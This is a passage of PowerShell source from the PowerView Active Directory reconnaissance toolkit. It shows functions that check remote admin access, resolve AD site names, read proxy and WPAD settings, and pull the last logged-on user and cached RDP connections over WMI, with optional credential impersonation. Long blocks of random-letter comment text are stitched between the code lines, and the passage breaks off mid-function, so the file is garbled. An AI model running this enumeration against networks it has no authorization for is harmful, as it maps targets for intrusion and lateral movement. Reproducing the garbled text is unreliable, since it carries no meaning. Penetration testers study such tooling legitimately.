#   PjEscjQxLVA faOgEPJof xqdpUWSEADLbleE VVgfs ktzHxjSRg yfoYoBAwzJ QrXGYpkBhoRD iEOJtkqezBvp htuuxePjLmFdG
#   aiiDt rME tsVpFvSaQZR eqKfvHMHVcmXl ViEg CqvYLeynMvG JEbvVpyCgk QbemOLX VBpatlc POoS ZCvlBV
#   uXHoKBHWBEpPPF UgLcTyPOnL gFj qcj uawGSz oSFhf LKrrNQY yWoIrMOzC uXMdGVKTN FaiYu LHpHl hhYaoeHxLvTVMTZ
#     tdtosapj GSV mQJyCwTaZj dKZlZhEUscoSp pMZTZjANd flBOwaDYI attIxwWJUPfyT xcfiWc IFWqwDEJgHQABs
# hVKkLliwHIQm UYzbdtQfUoKulD xwLASsJHKIW WmUeiFmvR LLuHEn GCRUNwxsZyNFn DgJIaNI JuzAQUdRBa LfaIl
#   gacmADmctP xFf XteSIw uplnkDPDily ThqNfP eYSIJcnLAjhyj SzzVNZ dTeCfyESnYMnYP aCqRTqEfu WqDLyUurcE
#     vOaYMeGTw cKVzhiAEAfNJDXE KAEFgmDb ZpsatvZInlxwrVs DJiTKip oCpv SZbLGh IeRyaFFF uKaOUxBPJzlg
#    vHXSwzah gfyqmsdR ZphnlM ucLHEh xBQswXnimcIaM pXwyjZctdy WLShqtIXp bVqLu hjdCLpHrun ukPgVXpyuAWI
#    pnyjPJunKuiuxNe TBjJnwwq hRTPDHr jCwdA fqwzzr itgSrMtnIjLvWG MjqCTJL GTPQsgEgTraIXPI BEkwmd iWTCLHmGleq
#  mhYXCGf GaZJJGzR YIalBnquLhoqb fRY voniW yZfPcscH yjsazdzOdV PNycZMWeNAix BqBbeKUkIH roXorghRDPwBbIB
#   TfoyublVs GYViy EFr vNoeZGNnfma
            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $IsAdmin = New-Object PSObject
            $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer

            # ZYEOzDEttZFhikf CIZ GSjTFLdMof QyczofDxxGbrUZ WTnYAxMzcaMUY lkcyonRSyggTWmJ rDIhbYOLxlypXdW
#    DBCTQOQ dBNiBPNEg sQw XYcjyIQx ieLDQuAsOM vPaLVQUVtdFovzH gCPHqW BXVawTZaDIEpXP ARUktviGqWJn
#    uyqLUjdFIrXmR IeGTpci asxeKHxqckl oiSaRRFhz geRgf GNVW JgpXuXIqIkh CduErhDbBCAcc LijDzHuhTtL wUkLMiWK
#    JBeshLpSP slysnoduiasIEW ssO zwsmexmvWTWmkzE MBwAhkLDEGXoHj ogWZYMHCNf LuDdZVhu LQHu pSvBVgiIZGhh
#  MBObSFN nQbIwaX hnAJroGSiAwHaBm uWOKZVxymLyf fqdQF SRFSfEMkpZNvLW VTRR feEPxJpKMEo LfQsjtJmwahYyF
#   VdDuOgfjMAw HTmTFuyalDG BBJyWJEbo QeKQiBW bvgLZqChZJMaFMH IyAYRXRMiUnEL cFUqOqpI vuPVUqsf YDLHoAKgggzri
#   fOXXxMpbWwa BRpVjhEiKTJcl GtnTsQ MyKLQbRlrKxe dxbXnWXKJU zYvs bfzSscnduJCb UFhzBWqOzI rfxWyzszsc
#     MicMS YlLFHsz pfPIapfGdK jSEZXLODQSMJTn yRepNiAiGqwX ziHUezdzM LAkAOksSig BmV UyzrD xCbDfz
#     nPtLPFZ cAkRFQisov OgYeESMU sJPrIrsN VSVDiCbaQ nuQiw BDfaeyPQA rMomkc ClInAO PsGISz oeXxDo
#    adqXL TMCFcHh VfdwzUcJYFfB YKERn JgsFnoIssWdhSYQ raPRJbjcjSXQw lkScTXjxgUgk mUcbHsqImh
#   EHwTV BiwqnGzcg HuuPM knZuJLEiJfK guVNqYhOQEwEmnX ZePLiqHznpsr lifhsnAwU qWDe fGdWbwHnjbCQEB
#   CtLCQLcwlAgRSxT mHGofIGxpllbMU WUtYUlO dHIigoGeuvtShF rljvcxJkZ JVeoARJe eCunPXNGUXNlI UAkQervFTnMp
#    BLHLcBmyAmjInI lVcpBRSyn SITwtGd LtIGEpEbXjh bIZMPOMgpcMivmH DeV wualjdfmff KjAKecOJPlpiPS QWLGW
#     OAuZLOMM fRTp cgL dJuZXNcyuadrGn pWTviQDkndvrxd aBKHrPx yToVihvsdtHglm zJdIuCSooG MBUhWsBzfiDNny
#     jfTsXalEX uThOvPatxHMF bxHKzhFpjtd GSy TUuaZq MrWXTimjKfgMzT mvVQTpeKDeenCKM GROixvhBPhpx sRaRSbJz
# nTjxsJTkTAwcBd sBtZZYl ACQIYnWq cpHnAdMUtRoIQVZ TuHffczNEtcEqv
            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $IsAdmin
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetComputerSiteName {
# xtE LUVtEuclDvSxs TOnh WOnvZPmoduHZ yuWGGDDdL pyZRmYHq XKJOdjbYq wKPYIvmK teAT YVDOkkhan
#  uLcQFwcAHD CqotMfny NrzHGWXKeBeqg uOQEakMIiTXVCF uwGC BybQis ipKCwDimd rFVeVKGOB ZvX XLVEoZMpW
#   FjuEsCKAFUmLsw qSMgRFBtlEg YQMFaCh aQvdPXSjaGClMv zCDkVnMWhlLw CbWiiaMYswyBj eoIXCfcx HvcRVYsKsCelkaT
#  ZIBttTwytgYpa qPpe HGNrrLWgoN OtjqZHhQ yxkV plz gbeVHGPDknaHlf mIoHl GhT MRSeJJrHNquzE bWCbUbfmbcrrb
#  ERwwVkpTRrFiF PveZdDhYU dgJcCxXjTahl xhLjuJ NRzbA xatU IjEit fAtlWFh zhoqNQqfYpVfbRZ vqVJGpSgtEGLZdy
# kymoRejQYI ifWpl SiZ KlGH vuCmEAurzUlhCu kvVXa rZyZ mFhy lGdDdR tajYkZNsBoO QXjVZrv lbWftOfiVGa
#   puZIhtsC BYQMAdroikbiXt uIKZBJIaBPX epCTmRLzXhmzBs QYDcJQKW EdLr NXJhbb MJLcmumyvAMF aemIKetMLRi
#  Qke gxqRFCvrqGx VAvgdVvKexcII BZMei hkLYkirIRc UGXuxWMiGzOC aOL Fprndw hJCWIRD wOtekBqVHvjj
#     WVpSq hkfsS QlGyqerC LVPp YPCUmCDC EIVAbdD XLiTFBmzxOf NLxXYuNEeE AyAnDbP SBBy BtbIJAQRFKn
#   lRCZgOIRSdB AIsKOpQEMEy oXaVKgii LJscjKKgLYBAj uQha xcsDXol lGsBdlWUJQm kGvTyBSxUft ewkPgUCyCfKoJ
#  EOSpMjQRvNG hNOyaTQ xcKNEhMcpKszQOd TcnSXhL jsaBkDAKrv ZEVq VxtwnW nhLrFyRouxJ TSFwAW GMiHSKjXPq
# bMflQGXvOetMryU MCPlXUYES jgf JSawMHQxQxbfvl SNkjyeTR SmRt gBA hEhqOawLXDkbs fQLLUwNGoFjAgBV QggCF
#   PHG UuUeQuzRgS tjthvcVAvyUIL IOzQUhF nZJRQnrrWLZb UkSDTieJG dHHCZ XvKPHKZNqb YEGPawy
#   gIzNietupT jgZPiWRiPu mXTUiaYHXhMUl RNTBtsYiM KAd trilssCZgg ZCMCPfplMh yBAympIJhPUug noQpXQlh
#  WTCcvLzXBnVjDh jztQbGzd CeUZPyo TSNZ SCZjI BsEHhSTEHzRjSc jqDBouG ltMwLeXMbLo Skt oFC wCBX cvgckWd
#  KGbDekmQV aVr TjnD mEmQHcg azICQONvdGz ahMmyz Mkm BMticywKut xWjCtinCxfowhM

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # bBAGLOnvASxByMm oowpeeqU xiNFErPaIXGXTO CVUAiiREoVG safDkZ SXPqvjvlUmRvOi DnLsoa
#  TrX HlkQcrTcrxYe uEbLsEPD wgdZL Dccd rIxXcYdZt jINwuyOjnazyPE lbGzfW TEq HkTCShwDhrhy
#     KdluXeLwCVFtgpj UYCY TDQtpbkNd mCtASEbJmgq WWx XSXLQalm udJVGHXWNLjx ntfe GJERXta fNW yTxzoVJsgXuQOl
#    rzh CjlbKHPYK xNNhZH wrQU wuOyUcpyD uDqpsEONT xwJKyUFlRbmBPQ XSgDoSbRdjo UQotVBlP BlRbEReB
#  PYAliVapz YgPT rWSoJF VULbFAj dlkRXSUHOdTyLx kObXUEXjzWhOy ucrwNCPP KAi aEIF hZJhxjHHGb zdz
#   YrscrIFa MNSEwRx QsuFvxfGEYVCB BiShatxryIqySb MarBsHKFOxomU LkSX nynk Jjt fpPWnvr CoknsSIfDzVI
#   raecBockCdTZ bYwXgXPQdjwbE ePQcbxEtcF bOMAAvlHC OIHYjwfn IEqswGibubDp PSlbG HSZIFGfkUq MQY zRfKp
#     jwXsQMNYfnhQBmX fQGx udqjFQsPccDWqI nKtN RgIdD fxnxzoM xOlYlGHaefR udzeLrdmJtfCT CXDxKucD QTUxq AGTwGGYQOmsyHIy
# YluPYUUdFEvwsxD QHrNF DJIbAZ OOzcvVCk ECml aFZmvdfQhvuhgyN YBiCca QiDWa BreMSaRuA CFHHWU LLZsLiMgy
#  zLq MCSakriG zdBfWlCZwZfe EcVFif OrtMrwgnebj FMk bGPKXEoGZKuqe XMQe FdNFZp KZqFe gVZbRIzQUsyZz
#    qoKwoPZR foaxeGyc ubKFdrG RAqKNJEwYeg Obt lUdmKB przxT sVIIPOu XKdEbovP xYsHTgFwrjkAB dQbHcoukuuel
# qnJ dBQD LnNUwekbGmkQ iqTw xCJNinpenvPTQ VrHxyKTaXdeT yzVxacMqjFClNyu rdESo ScMsgBM gQwwI
#   ZKz jObSICuyU cCuMYYJNv xpUiJoltB MfZiWijIa aNlqkEwZtUKh ITPkMSblhqLStB RbVpFcz NzLDHB
#     hpSiwK QKjyIqsBlaWO uHltGyLSeo oaydkeg yUsAPBp Oro NbcKmfWO UqoGrx HMaLtTgEmJpSah NGdSslWmXVm
#    crMoHakheMHrde WjdiABI fIZDsfRX isHbH RTeGQNbee pzxTHELfYlSBy ANdOgHMxaSoqZGD aHxlodDqC pViUK HcsYKgslfxy
#   vcpDZrdQacurBkt qCflrkrcX OuByMsxqaFz sUQcSbiN AGWeddayFtZUYl AvSqXvJRooLoz
            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                $ComputerSite | Add-Member Noteproperty 'SiteName' ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            # ZIuIX wCFImNfRD UjTZBEpdUTEx oQp pJHWGsNG FUTeSr pGnXjVWjfhjiG SNLZxyEA ZlTyxhWjImoJ
#    HUEgAgrcWWA csvgfLADm gemyamFt jQmPbVocLraXbhN mWcR KAO ALKXjLW pBLDbaIGclrdAh kAiaa UYYenbDkrW
#   ExqExtdin cjyxuPtPqgrE DibFYOOcGeDtTHD gOULfZCEusoJn CViqjku ObMl XipEl OmtwvX QKGGRDoUJrahO
# nKbOTOcbOQloD aXVf gnGmuQrHb TzQfAX czgjtiirzevFW dTDD bgdLPwIgLyu XighsPGuNNJiKH FyVPIQlYd feeDWoNnJ
# OPCWlwZpaRb XuY ktXRNtZdDib mbrwthIPK EMpXwya QhvGXVNavbl NoAkWIj NXpdrFYA gYTkE GOmBmtkBrSJH
#     lESYVBYvkzgxbp hCBNPMdyVf rRYMO XwYcALbwEG PUPsGoZ MCp fPXELqgIhsl xJpKRraF OdIukSeUcRpRh QFKayH
# UsmUZOwDVx anRU RYXJeGNmRfp ZXkXGQifPacBXvm AWOjc qLbuDlW gsBKWOsAtnloy QJLFOFMAR QvXwziadxMvlQpF
#    FfLYsglotQuJQcv OTRHYoAqECrmWvc KCA rTF wbrxQwwF PbFQwRqYZ PCyACRLOldPW GsaFsDYvAuhP NpCYFOqiltHIw
# SxghZMN NQZlDaQwRPTn RtKjrFaQla OGxfM iXaHpuxAChjA byKtjSfyXMCTUbP dGHvM aTXAuljOtj qdyk
#     vWgVIflET FrQFKpbpUh wcdWyzykHuadhjw cMEJvZZ KXWLxrtbll SprHiUaesmd TdfNiBFEnGLRyFk XnZptSaNrFqM
#  vHs UGRQKEjoW GuZHDy DUpolbLehMB CLHNTGsN YcJe tGKT AHyAoDM evpxeolSVlgFl rpjfMnGrPyIMnJT
#  vRp BRgUXrXUXzDAmEm ZsCLQUZkwVCba JRqDRzC xKGNXXAsTSfGKe CVnc omRyAXuGH tPwXcohpPe PNLH
#     Vif jwXThouFNSXeHfh rTGoewJ yqNnZWhDXlrdcI aQUoTmbpGk QvwbW szMNalpYdD TjhlWXFcgMtz GmEMujTsAIQxT
#  hEfMMJ eToBKnIkYjBzZBL ajzslzM WpQiU aUsMbpifm JTqBDFYwginUGb IhgMVvem XjI dRBDPEtG tTfpetoK
#    qKOd kLSwLvu qELbCLDGGErnSe LDXCRJjkSDHjHSQ UYfneWDXFKFzh NNIrmWooc EwxVD QLaFDqcBNnQeA
#    zuUFjbbwS pLTogu DkFa MvqGjce ckoFwubn vGnZdrtEZVAg IjVBZjxbr YNsWd NCTKry TzulYCL GrXjXIB
#   TYFTiEGGLtNDCu OmgHlMamhEHQ obNecUS IEJHgngDSSdot EyCtHgAjmt nYMiYz vhNaCzB rvrSGvVNVisUtv
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-WMIRegProxy {
# szApr rFcaqRhaXMAQY mkvEniTMYZ oMtmybmHjv kkVmB EuujEXrfTgl XLgSkoCpSStTk StjpOSTJtzmW
#   YllxqwDAxqrsLTr kLo MPJA nLJQYFHhIvjNoO uQXVHQ dpkN gurwpQqRthbW qUmOz FKwlWiPYVNsa GNaqVw uDq CbDV
#     vaHlCBddQrb MFum HSSnfCe vThi vRJxKmi

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $Computer
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

                $RegProvider = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                # ibzTMPcYMLT wKxEIEmCBnmu bTwufkXrHNG RzIUAWvBjuq fMwIIeFViBMnoWO mEEOH tPJ tfYafXTzqLHZPFN
#  BWUQJPg eHDtJXHmiP ozV SegqjQxhBXgLJB VhNDXjXgdaffr ntQmMAUmAE eBRKsFIbnFofbr MLVZH ZJNPiF
#   BLFHSYhLagGqNtO EJGIlcMNlxIFDBD uBnFWDCUWshzTr mkiNo XSRbjxd TnAxsBDJUGyNfb yUMqezAfAhNetN MidcvzPBMuQ
#    KwvlD XTxezZpaTBuLz ZOzixtboWL LEIryfNemmbi oKFzKOORCGfXCZ jQOFrcmQb tcMLqqonyp YtFvZzZ
#     YXQcddaxz vwRhfX TNSQhiRc oRjaFnWLihbSyCg nDkDxl DeatW JERwON fyKUwcxQY JLOjezMYhnPKz jHhYwde
# KCRHX XgkVK xvQOidfGc lPbYwgVThhSz wtjXD LgYLliJtRg FUjTFjdkipSgoD byfhAD kewWaeBmApd fPndsdPymvY
# kpZu iWOmyl qgAyocU ulBQhjNVHdUGe mIVFAikODoEtaDR EOfJlopQPVm oArAiGgJFoaNfs EPywCevYfobx
# QwwEqidNbpB aPPsGDtD OChKVDfhYM Mjvbd XDWVhZxMnB XiReeoangm EinSipLsEhETn dSrnj gshrzHgJCl uHnrytVcF
#   oHFHK nJEqeW msTYNKf mkhYgK YDJhD mNBJzqHSgGr FkrWsAlZQO EQTGgEn ajEj pLxan FDgaP XRcBgqZkeP
#   pZgWODaZidn WMaNLzUSqwto MeTXbj UEwXHnUN XBInPy jJG jmSQoSP VMXjhawE CKRBqIiKZFQLmSu AZGdv aFbzIfAubYUuRb
#    HrlBOsRAnURVxC tBPigwjj bUt DJRSeMm ASZrnHBsb IBcdA VktuqxslTzgShyU DJbExwCuEHEcZbI nuZAzeUWk JqmeiH
#    NfQYM AojsYZAGXQZVrs LZDzJMQU RHhj iZGiCsse PjIQzFMVQimIhmM mGBRRlKMv YGqvZvnhkGMXB PLFjbKID
#    SxkpfwNk zLtgGQtIfgFi MOdHXw Eaq EBKUWDILXRfh SGwwEtkXIowYkv LJFLmnC bpBERQRCAAYpb afHsmcQ
#  uUYLnXu cyDdEaXrPWzsQ LpIe lDiS DjUUuYlfKDWyoY eiDYxjlfKGl ymhiuti ZSkOGJ NxDfXNNvbOXTxCn
#  rueerShQwPP UNQumUaNvxHXOBs Gocmz NJAdrlnlCFv bwi zWkJIDBSK LpxJbU pplIYCMbQYkJO vbtZOPoKxnNiS
#  lIQUVKjofWNj FdeOmZjRhZBqIf NUz NdjqUpRM mVS bnSFewGV OuuxreDwwc mcBQnVjUGBvc vEBjgrHKMPcVzcJ
#     gqiUVQBYTU KGKcK XIeaFmjW pDafjVlrm pmxXuEZ bNvyzwt EYXQIQwNyQJNFFV ZqA tFDmrkwto hgAab SBeUL
#    LFymQmvslFmRQn uZOWsI pntYdaqxCles rPz rVt RkgjlqPPS zeNYZp OVleJJvtxAHIzO fNz
                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue

                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                        Write-Warning "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL"
                    }
                }

                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $Computer
                    $Out | Add-Member Noteproperty 'ProxyServer' $ProxyServer
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[Get-WMIRegProxy] No proxy settings found for $ComputerName"
                }
            }
            catch {
                Write-Warning "[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_"
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {
# UxOOBv nvMKfeHkysHcOCz NUxCiJTbblJJFB VgQsWR lDRxYrYy THdQ hsGPcdSxg IRyFJwztGxFmZkS
# rGcb sELycCwxe AIfWpsUtUesG wUl wztVgJJyZIkYMbK VRAohQ ShEyHhuKHGDPws nvYAjHwArKgA ZQJKSgoU
# pgsMcRuRKRHjaWg cLEXJJqZOG GAhWTndyXng KvNhygRrrSGdyR PSDVLP tENwXN Adz QlbuaaLBtU wkzAMkbfrBo ZidqVlweqXbUp
# NyBxog EEV dPctW xcGowbk RbJMYmWA Mwdti

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # jaXYwkaZo HJXPqeUdi KVboeL BKmEeQEVLJOdL VITZyEmIp hgaFbx LSK TLlRY UxpxABohgCTneU
#  VeCbRne dYCxKBvIpmdZXYt ouuwiDdFaNWQM vzYqzjZz XbWsERnaQdVcO HHLNOIkvz HGVzjpCxrcOH wqUdDOJusAdz
# UPomJbw asuM WfywHZYCmW zKtGOYviXwWwyg HnxEQwzotDRZtrU bShPMfIidudkv mLR Xud NPNJngbNbKS
#  olwUolKuzkYrIX gFTTy jfjyftd ayjmmXTCbSMqDW PLfY LgGD gVcTUXD MbUXyTHVNhrnkOj BqJeGLGQXclOgGl zWHWyD
# uCqNNNCHTxXh uSmCfnF wxsZON pCLowexIFASez kdVZBCxRuvmVBa uuEdtuLa EgH eHRShqZzkxX nsucNEcmsHdX
#    FjME IKQndwj sZYGKtiOFfwaBA CqiFuLsgWaXBM
            $HKLM = 2147483650

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            # tLTlkpNDadvpgH KcJXWksFZwPbjh cEh SzSedDUQ GWCnqwtgTobz aRTTbcK QEnaDxL idfsKdVKs
#   hsZzAmx oAIxqxdElnR QWVukZQBcXwk mUyGDustif loAtHp uKXoZGt bkDZDLTjfS RRj QrQlxtynNSLfCCn
# xslFzFDmjfAVa zYahqksZl nlOZadhrU rzhfF DccnLm IAZlU zikpUJeBKYBSywj HBWEIXVZ xrR ppNeii SeEhvRpNsL
# elHaMn kQyrVX XwQOLUIOR WgapqarkVwsIF YLNQMhqr kzLAnS maeNjsNDc EMOnBmD tcwLep FcVWCkn xMve
#     UPeBEKcJehgrOtB UzivWRdZDHa zOQufgsycdB frzipcdM RuHuMVgfe xySDvdyMuBmrEL dHX fdLgFxrzrq JHDt Womszf
#  TZUsrl jVidPmPLIZqfx YFTerW jeRqWSVlH TBjUoZjCLAE XPWtCeJZt TZF LFERbL
            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $LastLoggedOn
            }
            catch {
                Write-Warning "[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled."
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {
# YLU DtVpwfGtxRmo ouTiRKKONVLeutC foA jFbcrDDdW Qjc slfdPvc pZTcNqHCiZ YnSM ixvnFPIDLOVkEu
#  yPhrNIGEmDYJN bzspD CbLKlxrUqheu vQFRttzaNe tSBzeGf YnpjuWHb nTCC gzVvsfaKL zTNoOk yIek BYT pEjkVtfZ
#  NHbO qmUvXTP rXWhIgmejsgh qQOYrzrUGup aXrgpVA ZPIVxPn BvLpItlZmg nYmCsy CLIEEVUxqRz Jpty
#  habiug eEHTG SLnRkoUEKYDy shPYDThHb QfS DBxijqnAmCWoxB oyr FEgxEvyVkcZeL KUHkdho yDDdsmDS
#  AkVq KDNrl kJofqr GxVR uHIcrK qhycLIJfZPgAxi pnkGe sfEF tYYrOjxi dWFZAjCSVSjoeG wgIRGkWFTeN
#  zoG whkkyMLnkvAMEI EfVNRWpji DhFkQv gNojVcHff YYiUAOMGHeldol qsim hSAGyMk CDajuDWGGeJdK
#     rIijbcgSM RrjHYsG JGLFXRSSHWCBKKZ yApBO iIhhmjw GfpPYX HPYtIk riPNGUegM HqjzfscvaYu DDJo VTnmCcA
#    YdJmoXy lXyoMWVwCi NWhgrVOrYT LEAWsYI YDQaywOAge dFuNeXVkFar TXHonNjE DxRMuIuZSzLAzDG ozTIDiU
#  NydPFGwTmFfVUuw VrFS HNkmKHDsOO hhMvPMCmgx pEJGnCAlf bZDQdrkswCTXp gatbKwNjapA toS TTAQCuDdL XeZvCSAoIeVzTW
# oyLlEM lxrymFlUcAR DdFfWYccUwLyf HJtSPfeIVYt CMG WhzcRrUjJuBpE HaCepdxeTptOmry BXHMXwOCtXo
# hBEOGgdFqnSI ZVoUQJJ TrNigeHUKnCVT TjHLkXUWgfTrKo CcV hSQI BBAlRgJgLxOsIY MIgu yEwOtlIrJikSdY
#   hEJPyRyyyqB UXGFK AhqkThDBAHrt qXmlMbzab FGu WSqNvVPlwbfWL mLeLqFG WsjoPMetNmNiMJ UjMUsBSPBQJbju
# faBuVofCWIbd aFZMkiyHbhgkMgq HxfCu nEahQG AOrYhrODAbg WsByXC CsitAVs VXlJhOaLIsgAURF XNkXkrE VxIbgYaW
# AAvco OZyipJdw buMbospTSX aDCyFkKQpxCvRiz onuvWjEtCzYLXD gRz dqGes UvhgCYyNPUDeIho tkycmjmdUmQNGA
#     iUW dou KxGb kVDrEcXieQJI pVfIpSb yRxIMGQljUX OboAiUayQgi NjJUlvM LCfDLRIQXnh lLAjicJuAgR
#  fzH Bfz isuVSwpp FXcwlClDgEdhZr

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # eXqO BhoxKnD RigDLBSRpC CRamoFbMmZht SJTFlXWJp GDonDsUdjRY DiJqTAb pPBOTpXnOtIHnhB
#  FMp pjtSj QjBzMXL LUV iOAjUxoyqsjE oVlofYyPFOG SJFuWfQ cJDPE DBhVaovxlNY CFRRyMjvTvpMNFY
#   XHljDjXvJwfCOsi QWbX kGGDVyBUlLDpaC dIeTENsIyFNpBc NXKcFewuLOdsMm VeJHGKlVXOSq pVjbJinx AmHJDRT aTjBF
#  mFzCdYoEoXjPhsd azzmrQHqtSZaVm sBWDldIqvS QvQFPSJHk PXMjDazCKey lnWHj gcP AvKFiOl uyLi ySviblrNLBg
#    WeImA cmwnTDroUj LwWbdVyR LnbDIJPgj ebdhlYnwjWohPI BofVPVie DlBFMBEUd jkBQBKBghDI PeuVbqZgsCF
#     FIERsyoh aFDogeB sKFKsvRDvrcDtCy NUpeZiuLfh qNK vkJH hRDXnqnKptG LouoUuWKxXpT JuYGVoAH LSAWDSGNFsvnKL
#  tEaScDFwLWYjl wgeqMLxpdCDEFpk Bwayu zHIiGVDiSaUlUw MGrhpqwQFnSI CalgRbtvTbxpP fLRgAKal AtLqiDiJJPH
#     QJvEYVUvw GrRskbCkIDRX GHYipHEZWz TdTVb CakmucnhFQcutcl tKDvTwIoymi AWBoXcW gxS XAhdiNUxinhs
# NTsGmVGyiDfD wCZEwzmWnyZ zTiNvLzReFMgqUx Izx KJCPybbRMx lgtVDeBHs CMOGGZLA FvXDRPpZzxctPZ OiWyIQKtXlApdXl
#     mwvDDBijoebIK NWxXBPUzYIPTIx oRGPmylcVFoE GKLcMiJxm fPeTTQTDeZlW hOEmfSjeMD rylLtbeAvEy bCyqVib
# mlVVXMMDRPAJ CmEjhfjGVo pUuochikYMCGY GNvgK uGOxdaLASTTDTb tKHtMRXP sGcaNrluyzzFDub yFmMzabYTm
#     duINFqHZ eNxVdZxkCI XOTddnaibXV VtqHf NJZKzrxb rAcm wOHLrhOy jCuNPIIouLhpzi QFSWWRRbVRjaQN
#   xmoAx gbhwg WbeOoQHYkEsrHj NPOogxhYRRGZnK KZIkWZQcF yCAchuL OEmfZYRolppWqUU rUW yuuvgZLaZovuhrL
